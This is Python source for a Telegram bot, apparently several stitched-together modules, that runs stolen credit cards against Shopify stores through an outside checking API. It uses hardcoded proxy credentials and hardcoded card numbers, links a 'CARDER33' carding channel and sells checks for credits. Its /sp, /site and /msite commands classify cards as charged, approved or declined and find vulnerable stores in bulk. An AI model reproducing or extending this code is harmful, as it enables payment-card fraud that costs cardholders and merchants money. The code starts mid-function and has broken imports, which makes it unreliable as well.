    mm = mm.zfill(2)                      # Ensure month is 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_ad(update, context, payload))



import asyncio
import aiohttp
import json
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user, init_db

# Ensure DB is initialized
asyncio.get_event_loop().run_until_complete(init_db())

# --- Error patterns marking site dead ---
ERROR_PATTERNS = [
    "CLINTE TOKEN",
    "DEL AMMOUNT EMPTY",
    "PRODUCT ID IS EMPTY",
    "PY ID EMPTY",
    "TAX AMMOUNT EMPTY",
    "R4 TOKEN EMPTY"
]


async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Telegram command: /seturl <site_url>"""
    user = update.effective_user
    user_id = user.id

    if not context.args:
        await update.message.reply_text(
            "❌ 𝙐𝙨𝙖𝙜𝙚: /𝙨𝙚𝙩𝙪𝙧𝙡 {𝙨𝙞𝙩𝙚_𝙪𝙧𝙡}",
            parse_mode=ParseMode.HTML
        )
        return

    site_input = context.args[0].strip()
    if not site_input.startswith(("http://", "https://")):
        site_input = f"https://{site_input}"

    # Default CC input (can be any test card or placeholder)
    cc_input = "4242424242424242|12|25|123"

    processing_msg = await update.message.reply_text(
        f"⏳ 𝓐𝓭𝓭𝓲𝓷𝓰 𝓤𝓡𝐋: <code>{escape(site_input)}</code>...",
        parse_mode=ParseMode.HTML
    )

    # Run background worker
    asyncio.create_task(
        process_seturl(user, user_id, site_input, cc_input, processing_msg)
    )


async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
    """
    Background worker that adds a custom site for a user and calls the dynamic API
    to validate the site with a custom credit card. Updates DB and formats a response message.
    """
    # --- API setup ---
    api_url = (
        "https://rockyog.onrender.com/index.php"
        f"?site={site_input}"
        f"&cc={cc_input}"
        "&proxy=84.247.60.125:6095:fvbysspi:bsbh3trstb1c"
    )

    BULLET_GROUP_LINK = "https://t.me/CARDER33"
    bullet_text = "[⌇]"
    bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'
    DEVELOPER_NAME = "kคli liຖนxx"
    DEVELOPER_LINK = "https://t.me/Kalinuxxx"
    developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

    try:
        # --- API request ---
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                timeout=50,
                headers={"User-Agent": "Mozilla/5.0"}
            ) as resp:
                raw_text = await resp.text()

        # --- Parse API response ---
        try:
            data = json.loads(raw_text)
        except json.JSONDecodeError:
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(raw_text[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")
        gateway = data.get("Gateway", "Shopify Normal")

        try:
            price_float = float(data.get("Price", 0))
        except (ValueError, TypeError):
            price_float = 0.0

        # --- Error pattern detection ---
        resp_upper = str(response).upper()
        dead_reason = None
        for pattern in ERROR_PATTERNS:
            if pattern in resp_upper:
                dead_reason = pattern
                break

        if dead_reason:
            site_status = "❌ 𝐒𝐢𝐭𝐞 𝐃𝐞𝐚𝐝"
            price_display = "<i><b>💲0.0</b></i>"
            response_display = f"<i><b>{dead_reason}</b></i>"
        elif price_float > 0:
            site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝"
            price_display = f"<i><b>💲{price_float:.1f}</b></i>"
            response_display = f"<i><b>{escape(str(response))}</b></i>"
        else:
            site_status = "❌ 𝐒𝐢𝐭𝐞 𝐃𝐞𝐚𝐝"
            price_display = "<i><b>💲0.0</b></i>"
            response_display = f"<i><b>{escape(str(response))}</b></i>"

        # --- Fetch existing sites from DB ---
        user_data = await get_user(user_id)
        current_sites = user_data.get("custom_urls", []) or []

        # --- Append new site if not already present ---
        if site_input not in current_sites:
            current_sites.append(site_input)
            await update_user(user_id, custom_urls=current_sites)

        requester = f"@{user.username}" if user.username else str(user.id)

        # --- Format final message ---
        formatted_msg = (
            f"◇━━〔 <b>{site_status}</b> 〕━━◇\n"
            f"{bullet_link} <b>𝐒𝐢𝐭𝐞</b> ➵ <code>{escape(site_input)}</code>\n"
            f"{bullet_link} <b>𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬</b> ➵ {len(current_sites)}\n"
            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➵ <i><b>{escape(gateway)}</b></i>\n"
            f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➵ {response_display}\n"
            f"{bullet_link} <b>𝐏𝐫𝐢𝐜𝐞</b> ➵ {price_display} 💸\n"
            "────────✧────────\n"
            f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐁𝐲</b> ➵ {requester}\n"
            f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➵ {developer_clickable}\n"
            "────────✧────────"
        )

        await processing_msg.edit_text(
            formatted_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:
        await processing_msg.edit_text(
            "❌ Error: API request timed out. Try again later.",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        import logging
        logging.exception("Error in /seturl")
        await processing_msg.edit_text(
            f"❌ Error: <code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )






from telegram import Update
from telegram.ext import ContextTypes
from html import escape
from db import get_user

async def mysites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for /mysites - shows all sites added by the user."""
    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Get multiple sites (list) or fallback to empty
    sites = user_data.get("custom_urls", [])

    if not sites:
        await update.message.reply_text(
            "❌ You have not added any sites yet.\nUse <b>/seturl &lt;site_url&gt;</b> to add one.",
            parse_mode="HTML"
        )
        return

    # Format message
    formatted_sites = "📄 <b>Your Added Sites</b>\n"
    formatted_sites += "━━━━━━━━━━━━━━━━━━\n"
    for i, site in enumerate(sites, start=1):
        formatted_sites += f"🔹 <b>Site {i}</b>: <code>{escape(site)}</code>\n"
    formatted_sites += "━━━━━━━━━━━━━━━━━━"

    await update.message.reply_text(
        formatted_sites,
        parse_mode="HTML",
        disable_web_page_preview=True
    )




import re
import json
import aiohttp
import asyncio
import logging
from html import escape
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user
from bin import get_bin_info

logger = logging.getLogger(__name__)

# ===== Cooldowns =====
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# ===== API template =====
API_CHECK_TEMPLATE = (
    "https://rockyog.onrender.com/index.php"
    "?site={site}"
    "&cc={card}"
    "&proxy=216.10.27.159:6837:fvbysspi:bsbh3trstb1c"
)

# ===== Main Command =====
import re
import asyncio
from html import escape  # for escaping card_input safely in HTML
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
SP_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # --- Cooldown check ---
    if not await enforce_cooldown(user_id, update):
        return

    card_input = None

    # 1️⃣ Check if card info provided as arguments
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = SP_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # 2️⃣ Else check if reply message contains card
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        raw_text = update.message.reply_to_message.text.strip()
        match = SP_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # 3️⃣ If no valid card input
    if not card_input:
        await update.message.reply_text(
            "❌ Please provide card details.\n"
            "Example: <code>/sp card|mm|yy|cvv</code>\n"
            "Or reply to a message containing card details.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Ensure 2-digit month
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    normalized_card = f"{card}|{mm}|{yy}|{cvv}"

    # --- Fetch user data ---
    user_data = await get_user(user_id)

    # --- Consume credit ---
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
        return

    # --- Fetch sites ---
    custom_urls = user_data.get("custom_urls")
    if not custom_urls:
        await update.message.reply_text(
            "❌ You don’t have any sites set. Use /seturl to add your sites first.",
            parse_mode=ParseMode.HTML
        )
        return

    BULLET_GROUP_LINK = "https://t.me/CARDER33"
    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

    # --- Initial processing message ---
    processing_text = (
        f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>{escape(normalized_card)}</code></pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝐢𝐟𝐲\n"
    )

    msg = await update.message.reply_text(
        processing_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )

    # --- Run check in background ---
    asyncio.create_task(process_card_check(user, normalized_card, custom_urls, msg))


# ===== Worker =====
async def process_card_check(user, card_input, custom_urls, msg):
    """
    Generalized card checker: runs multiple site checks in parallel,
    performs BIN lookup, formats response in the /ad style, and edits the Telegram message.
    """
    import time
    start_time = time.time()
    try:
        cc = card_input.split("|")[0]
        escaped_card = html.escape(card_input)

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
            card_type = bin_details.get("type", "N/A")
            card_level = bin_details.get("brand", "N/A")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = card_type = card_level = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Parallel site checks ---
        best_result = None

        async def check_site(site):
            nonlocal best_result
            if not site.startswith(("http://", "https://")):
                site = "https://" + site
            api_url = API_CHECK_TEMPLATE.format(card=card_input, site=site)
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(api_url, timeout=30) as resp:
                        api_text = await resp.text()
                except Exception:
                    return
                if '<!DOCTYPE html>' in api_text.lower() or '<html' in api_text.lower():
                    return
                clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
                json_start = clean_text.find('{')
                if json_start != -1:
                    clean_text = clean_text[json_start:]
                try:
                    data = json.loads(clean_text)
                except json.JSONDecodeError:
                    return
                resp_text = data.get("Response", "").upper()
                if best_result is None:
                    best_result = {**data, "site": site}
                else:
                    prev_resp = best_result.get("Response", "").upper()
                    if re.search(r"(THANK YOU|APPROVED|CHARGED|SUCCESS)", resp_text) or \
                       ("3D_AUTHENTICATION" in resp_text and prev_resp not in ["CHARGED", "APPROVED"]):
                        best_result = {**data, "site": site}

        await asyncio.gather(*(check_site(site) for site in custom_urls))

        if not best_result:
            await msg.edit_text("❌ No valid responses from any site.", parse_mode=ParseMode.HTML)
            return

        # --- Extract fields ---
        response_text = best_result.get("Response", "Unknown")
        price = f"{best_result.get('Price', '0')}$"
        gateway = best_result.get("Gateway", "Shopify")
        site_used = best_result.get("site", "N/A")

        # --- Determine dynamic header ---
        header_status = "❌ Declined"
        if re.search(r"\b(Thank You|ORDER_PLACED|APPROVED|SUCCESS|CHARGED)\b", response_text, re.I):
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response_text.upper():
            header_status = "✅ Approved"
        elif any(x in response_text.upper() for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ Approved"
        elif "CARD_DECLINED" in response_text.upper():
            header_status = "❌ Declined"

        # --- Requester & Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Enhance response with emojis ---
        display_response = escape(response_text)
        if re.search(r"\b(Thank You|approved|charged|success)\b", response_text, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
        elif "3D_AUTHENTICATION" in response_text.upper():
            display_response += " 🔒"
        elif "INSUFFICIENT_FUNDS" in response_text.upper():
            display_response += " 💳"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ <i>{escape(gateway)} {price} 💸</i>\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await msg.edit_text(final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    except asyncio.TimeoutError:
        await msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.exception("Error in process_card_check")
        await msg.edit_text(f"❌ Error: <code>{escape(str(e))}</code>", parse_mode=ParseMode.HTML)





import time
import re
import json
import asyncio
import aiohttp
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from html import escape
from db import get_user, update_user   # DB functions

# Cooldown tracker
last_site_usage = {}

# ===== Updated API template =====
API_TEMPLATE = (
    "https://rockyog.onrender.com/index.php"
    "?site={site_url}"
    "&cc=4312311807552605|08|2031|631"
    "&proxy=142.111.67.146:5611:fvbysspi:bsbh3trstb1c"
)

# --- Error patterns marking site dead ---
ERROR_PATTERNS = [
    "CLINTE TOKEN",
    "DEL AMMOUNT EMPTY",
    "PRODUCT ID IS EMPTY",
    "PY ID EMPTY",
    "TAX AMMOUNT EMPTY",
    "R4 TOKEN EMPTY"
]

# === Credit system ===
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# === Main command ===
async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # === Cooldown check ===
    now = time.time()
    if user_id in last_site_usage and (now - last_site_usage[user_id]) < 3:
        await update.message.reply_text(
            "⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 3 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 /𝘀𝗶𝘁𝗲 𝗮𝗴𝗮𝗶𝗻."
        )
        return
    last_site_usage[user_id] = now

    # === Credit check ===
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don’t have enough credits to use this command.")
        return

    # === Argument check ===
    if not context.args:
        await update.message.reply_text(
            "❌ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘴𝘪𝘵𝘦 𝘜𝘙𝘓.\n"
            "Example:\n<code>/site https://example.com</code>",
            parse_mode=ParseMode.HTML
        )
        return

    site_url = context.args[0].strip()
    if not site_url.startswith(("http://", "https://")):
        site_url = "https://" + site_url

    # Initial message
    msg = await update.message.reply_text(
        f"⏳ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝒔𝒊𝒕𝒆: <code>{escape(site_url)}</code>...",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    # Run checker in background
    asyncio.create_task(run_site_check(site_url, msg, user))


# === Background worker ===
async def run_site_check(site_url: str, msg, user):
    api_url = API_TEMPLATE.format(site_url=site_url)

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=120, headers={"User-Agent": "Mozilla/5.0"}) as resp:
                raw_text = await resp.text()

        # --- Extract JSON part if wrapped in HTML ---
        clean_text = re.sub(r'<[^>]+>', '', raw_text).strip()
        json_start = clean_text.find('{')
        if json_start != -1:
            clean_text = clean_text[json_start:]

        try:
            data = json.loads(clean_text)
        except json.JSONDecodeError:
            await msg.edit_text(
                f"❌ Invalid API response:\n<pre>{escape(raw_text[:500])}</pre>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Extract fields ---
        response = data.get("Response", "Unknown")
        gateway = data.get("Gateway", "Shopify")
        try:
            price_float = float(data.get("Price", 0))
        except (ValueError, TypeError):
            price_float = 0.0

        # --- Error pattern check ---
        resp_upper = str(response).upper()
        dead_reason = None
        for pattern in ERROR_PATTERNS:
            if pattern in resp_upper:
                dead_reason = pattern
                break

        if dead_reason:
            status = "𝘿𝙚𝙖𝙙 ❌"
            price_display = "<i><b>💲0.0</b></i>"
            response_display = f"<i><b>{dead_reason}</b></i>"
        elif price_float > 0:
            status = "𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ✅"
            price_display = f"<i><b>💲{price_float:.1f}</b></i>"
            response_display = f"<i><b>{escape(str(response))}</b></i>"
        else:
            status = "𝘿𝙚𝙖𝙙 ❌"
            price_display = "<i><b>💲0.0</b></i>"
            response_display = f"<i><b>{escape(str(response))}</b></i>"

        # --- Format info ---
        requester = f"@{user.username}" if user.username else str(user.id)
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        formatted_msg = (
            f"◇━━〔 #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 〕━━◇\n\n"
            f"{bullet_link} 𝐒𝐢𝐭𝐞       ➵ <code>{escape(site_url)}</code>\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲    ➵ <i><b>{escape(gateway)}</b></i>\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➵ {response_display}\n"
            f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭      ➵ {price_display} 💸\n"
            f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬      ➵ <b>{status}</b>\n\n"
            f"────────✧────────\n"
            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester}\n"
            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}\n"
            f"────────✧────────"
        )

        await msg.edit_text(
            formatted_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:
        await msg.edit_text(
            "❌ Error: API request timed out. Try again later.",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await msg.edit_text(
            f"❌ Error: <code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )




import asyncio
import aiohttp
import time
import re
import json
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.error import TelegramError
from db import get_user, update_user

API_TEMPLATE = (
    "https://rockyog.onrender.com/index.php"
    "?site={site_url}&cc=5547300001996183|11|2028|197"
)

MSITE_CONCURRENCY = 3
MSITE_COOLDOWN = 5
last_msite_usage = {}

# --- Error patterns that mark site as dead (case-insensitive) ---
ERROR_PATTERNS = [
    "CLINTE TOKEN",
    "DEL AMMOUNT EMPTY",
    "PRODUCT ID IS EMPTY",
    "PY ID EMPTY",
    "TAX AMMOUNT EMPTY",
    "R4 TOKEN EMPTY"
]

# --- Credit system ---
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

def normalize_site(site: str) -> str:
    site = site.strip()
    if not site.startswith("http://") and not site.startswith("https://"):
        site = "https://" + site
    return site

# --- Fetch site info (with error pattern check) ---
async def fetch_site_info(session, site_url: str):
    normalized_url = normalize_site(site_url)
    api_url = API_TEMPLATE.format(site_url=normalized_url)
    try:
        async with session.get(api_url, timeout=60) as resp:
            raw_text = await resp.text()

        # Clean and locate JSON
        clean_text = re.sub(r"<[^>]+>", "", raw_text).strip()
        json_start = clean_text.find("{")
        if json_start != -1:
            clean_text = clean_text[json_start:]

        data = json.loads(clean_text)

        response = str(data.get("Response", "Unknown"))
        gateway = data.get("Gateway", "Shopify")

        try:
            price_float = float(data.get("Price", 0))
        except (ValueError, TypeError):
            price_float = 0.0

        # --- Error pattern detection (case-insensitive, overrides everything) ---
        resp_upper = response.upper()
        for pattern in ERROR_PATTERNS:
            if pattern.upper() in resp_upper:
                return {
                    "site": normalized_url,
                    "price": 0.0,
                    "status": "dead",
                    "response": response,
                    "gateway": gateway,
                }

        # If no error pattern matched → decide by price
        status = "working" if price_float > 0 else "dead"

        return {
            "site": normalized_url,
            "price": price_float,
            "status": status,
            "response": response,
            "gateway": gateway,
        }

    except Exception as e:
        return {
            "site": site_url,
            "price": 0.0,
            "status": "dead",
            "response": f"Error: {str(e)}",
            "gateway": "N/A",
        }

# --- Mass site checker ---
async def run_msite_check(sites: list[str], msg):
    total = len(sites)
    results = [None] * total
    counters = {"checked": 0, "working": 0, "dead": 0, "amt": 0.0}
    semaphore = asyncio.Semaphore(MSITE_CONCURRENCY)

    async with aiohttp.ClientSession() as session:

        async def worker(idx, site):
            async with semaphore:
                res = await fetch_site_info(session, site)
                results[idx] = res
                counters["checked"] += 1
                if res["status"] == "working":
                    counters["working"] += 1
                    counters["amt"] += res["price"]
                else:
                    counters["dead"] += 1

                # --- Summary header ---
                summary = (
                    "<pre><code>"
                    f"📊 𝑴𝒂𝒔𝒔 𝑺𝒊𝒕𝒆 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑺𝒊𝒕𝒆𝒔 : {total}\n"
                    f"✅ 𝑾𝒐𝒓𝒌𝒊𝒏𝒈     : {counters['working']}\n"
                    f"❌ 𝑫𝒆𝒂𝒅        : {counters['dead']}\n"
                    f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {counters['checked']} / {total}\n"
                    f"💲 𝑻𝒐𝒕𝒂𝒍 𝑨𝒎𝒕   : ${counters['amt']:.1f}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "</code></pre>"
                )

                # --- Only Working site details ---
                working_lines = []
                for r in results:
                    if not r:
                        continue
                    if r["status"] != "working" or r["price"] <= 0:
                        continue
                    # safeguard: skip if response has error pattern
                    resp_upper = r["response"].upper()
                    if any(pat.upper() in resp_upper for pat in ERROR_PATTERNS):
                        continue
                    display_site = (
                        r["site"]
                        .replace("https://", "")
                        .replace("http://", "")
                        .replace("www.", "")
                    )
                    working_lines.append(
                        f"✅ <code>{escape(display_site)}</code>\n"
                        f"   ⤷ <i><b>💲{r['price']:.1f}</b></i> ┃ <i><b>{r['gateway']}</b></i> ┃ <i><b>{r['response']}</b></i>"
                    )

                details = ""
                if working_lines:
                    details += (
                        f"\n\n📝 <b>𝑾𝒐𝒓𝒌𝒊𝒏𝒈 𝑺𝒊𝒕𝒆𝒔</b>\n"
                        f"────────────────\n" + "\n".join(working_lines) + "\n────────────────"
                    )

                content = summary + details

                try:
                    await msg.edit_text(
                        content,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                except TelegramError:
                    pass

        # --- Run all workers concurrently ---
        tasks = [asyncio.create_task(worker(i, s)) for i, s in enumerate(sites)]
        await asyncio.gather(*tasks)

        # --- Final check if no working sites ---
        if counters["working"] == 0:
            final_content = (
                "<pre><code>"
                f"📊 𝑴𝒂𝒔𝒔 𝑺𝒊𝒕𝒆 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑺𝒊𝒕𝒆𝒔 : {total}\n"
                f"✅ 𝑾𝒐𝒓𝒌𝒊𝒏𝒈     : 0\n"
                f"❌ 𝑫𝒆𝒂𝒅        : {counters['dead']}\n"
                f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {counters['checked']} / {total}\n"
                f"💲 𝑻𝒐𝒕𝒂𝒍 𝑨𝒎𝒕   : $0.0\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "❌ No working sites found."
                "</code></pre>"
            )
            try:
                await msg.edit_text(
                    final_content,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                )
            except TelegramError:
                pass

# --- /msite command handler ---
async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        now = time.time()

        # Cooldown
        if user_id in last_msite_usage and (now - last_msite_usage[user_id]) < MSITE_COOLDOWN:
            remaining = round(MSITE_COOLDOWN - (now - last_msite_usage[user_id]), 1)
            await update.message.reply_text(
                f"⏳ Please wait {remaining}s before using /msite again."
            )
            return
        last_msite_usage[user_id] = now

        # Credit check
        if not await consume_credit(user_id):
            await update.message.reply_text("❌ You don’t have enough credits to use this command.")
            return

        # Collect sites
        sites = []
        if context.args:
            sites = [s.strip() for s in context.args if s.strip()]
        elif update.message.reply_to_message and update.message.reply_to_message.text:
            sites = [s.strip() for s in update.message.reply_to_message.text.splitlines() if s.strip()]

        if not sites:
            await update.message.reply_text(
                "❌ Please provide site URLs.\nExample:\n<code>/msite amazon.com flipkart.com</code>",
                parse_mode=ParseMode.HTML,
            )
            return

        if len(sites) > 200:
            await update.message.reply_text(
                f"⚠️ You can check a maximum of 200 sites at once.\nYou provided {len(sites)}.",
                parse_mode=ParseMode.HTML,
            )
            sites = sites[:200]

        msg = await update.message.reply_text(
            f"⏳ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(sites)} 𝐒𝐢𝐭𝐞𝐬...",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

        asyncio.create_task(run_msite_check(sites, msg))

    except Exception as e:
        await update.message.reply_text(
            "❌ An unexpected error occurred. Please try again later or contact the owner."
        )
        print(f"[ERROR] /msite command failed: {e}")






import asyncio
import httpx
import time
import re
import io
import logging
import uuid
from typing import List, Dict
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
)
from telegram.ext import (
    ContextTypes,
    CallbackQueryHandler,
)

# Replace with your actual DB functions
from db import get_user, update_user

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

# In-memory cooldowns
last_msp_usage: Dict[int, float] = {}

# Regex backup matcher
CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")

# Proxy placeholder
DEFAULT_PROXY = "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"

# Junk/error response patterns
ERROR_PATTERNS = ["CLINTE TOKEN", "DEL AMMOUNT EMPTY", "PRODUCT ID IS EMPTY", "R4 TOKEN EMPTY", "TAX AMOUNT EMPTY"]

# Classification keyword groups
CHARGED_KEYWORDS = {"THANK YOU", "ORDER_PLACED", "APPROVED", "SUCCESS", "CHARGED"}
APPROVED_KEYWORDS = {"3D_AUTHENTICATION", "INCORRECT_CVC", "INCORRECT_ZIP", "INSUFFICIENT_FUNDS"}
DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED", "EXPIRED_CARD", "EXPIRE_CARD"}


# ---------- Utility ----------
def extract_cards_from_text(text: str) -> List[str]:
    cards: List[str] = []
    text = text.replace(" ", "\n")
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split("|")
        if len(parts) == 4 and parts[0].isdigit():
            cards.append(line)
    if not cards:
        cards = [m.group(0) for m in CARD_REGEX.finditer(text)]
    return cards


async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        await update_user(user_id, credits=user_data["credits"] - 1)
        return True
    return False


